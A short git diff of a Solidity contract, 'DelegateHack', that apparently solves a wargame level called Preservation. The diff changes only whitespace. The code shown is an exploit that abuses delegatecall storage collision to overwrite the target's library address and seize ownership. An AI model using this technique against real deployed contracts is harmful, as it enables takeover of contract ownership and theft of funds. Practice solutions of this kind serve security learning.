@@ -4,11 +4,10 @@ pragma solidity ^0.6.0;
 import "../instances/Ilevel16.sol";
 
 contract DelegateHack {
-
     address public t1;
     address public t2;
     address public owner;
-    Preservation level16 = Preservation(0x1E422B805DC5541a09fBbf239D734313B9F42Eca);      
+    Preservation level16 = Preservation(0x1E422B805DC5541a09fBbf239D734313B9F42Eca);
 
     function exploit() external {
         level16.setFirstTime(uint256(address(this)));
@@ -18,5 +17,4 @@ contract DelegateHack {
     function setTime(address _owner) public {
         owner = _owner;
     }
-
 }
